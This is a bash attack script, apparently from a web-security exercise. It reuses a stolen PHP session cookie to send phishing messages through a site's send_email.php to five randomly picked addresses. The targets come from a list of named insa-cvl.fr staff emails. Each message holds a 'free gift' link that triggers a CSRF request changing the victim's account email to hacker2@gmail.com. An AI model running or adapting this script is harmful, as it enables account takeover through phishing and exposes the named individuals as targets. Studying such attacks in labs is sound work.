#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <server_ip>"
    exit 1
fi

SERVER_IP="$1"

# Read session information from session_info.txt
PHPSESSID=$(head -n 1 session_info.txt)
USER_ID=$(tail -n 1 session_info.txt)

# Ensure variables are not empty
if [ -z "$PHPSESSID" ] || [ -z "$USER_ID" ]; then
    echo "Failed to retrieve session information."
    exit 1
fi

# List of email addresses
EMAILS=(
    "jeremy.briffaut@insa-cvl.fr"
    "vincent.hugot@insa-cvl.fr"
    "pascal.berthome@insa-cvl.fr"
    "cedric.eichler@insa-cvl.fr"
    "ahmad.adell@insa-cvl.fr"
    "helene.laurent@insa-cvl.fr"
    "benjamin.nguyen@insa-cvl.fr"
    "adrien.boiret@insa-cvl.fr"
    "emile.ferere@insa-cvl.fr"
    "sara.taki@insa-cvl.fr"
    "laurent.vaulkan@insa-cvl.fr"
    "yasmine.hayder@insa-cvl.fr"
    "sabine.fritella@insa-cvl.fr"
    "herve.duclos@insa-cvl.fr"
    "anne-marie.cornec@insa-cvl.fr"
    "ariana.grande@insa-cvl.fr"
    "xavier.butel@insa-cvl.fr"
    "charlene.jojon@insa-cvl.fr"
    "vincent.maki@insa-cvl.fr"
    "lucas.durand@insa-cvl.fr"
    "marie.vanhoenacker@insa-cvl.fr"
    "hugo.martinez@insa-cvl.fr"
    "claire.dupont@insa-cvl.fr"
    "maxime.lefebvre@insa-cvl.fr"
    "sophie.richard@insa-cvl.fr"
    "matthieu.meyer@insa-cvl.fr"
    "laura.benoit@insa-cvl.fr"
    "nicolas.clement@insa-cvl.fr"
    "julia.martin@insa-cvl.fr"
)

# Randomly select 5 email addresses using shuf
SELECTED_EMAILS=($(printf "%s\n" "${EMAILS[@]}" | shuf -n 5))

# Construct the URL for the user email page
MAIL_PAGE_URL="http://$SERVER_IP/pages/user/send_email.php?id=$USER_ID"

# Loop through the selected emails and send the message
for EMAIL in "${SELECTED_EMAILS[@]}"; do
    echo "Sending email to $EMAIL..."

    response=$(curl -i -L -X POST "$MAIL_PAGE_URL" \
        -b "PHPSESSID=$PHPSESSID" \
        -d "receiver_emails=$EMAIL" \
        -d "title=Important Notification" \
        -d 'content=<a href="/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1">Cliquez ici pour un cadeau!</a>' \
        -d "send_email=")

    # Check HTTP response status
    echo "----------------------------------------"
    if echo "$response" | grep -q "200 OK"; then
        echo "Email sent successfully to $EMAIL"
    else
        echo "Failed to send email to $EMAIL" >> failed_log.txt
    fi
    echo "----------------------------------------"

    # Sleep to prevent overwhelming the server
    sleep 1
done

echo "Emails sent to the following addresses:"
printf "%s\n" "${SELECTED_EMAILS[@]}"
